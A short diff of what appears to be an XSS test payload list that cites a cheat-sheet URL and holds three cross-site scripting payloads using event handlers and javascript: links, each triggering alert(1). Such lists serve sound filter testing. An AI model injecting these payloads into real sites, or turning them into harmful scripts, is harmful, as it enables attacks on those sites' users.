@@ -1,4 +1,4 @@
-# https://gbhackers.com/top-500-important-xss-cheat-sheet/
+https://gbhackers.com/top-500-important-xss-cheat-sheet/
 <body oninput=javascript:alert(1)><input autofocus>
 <math href="javascript:javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
 <frameset onload=javascript:alert(1)>
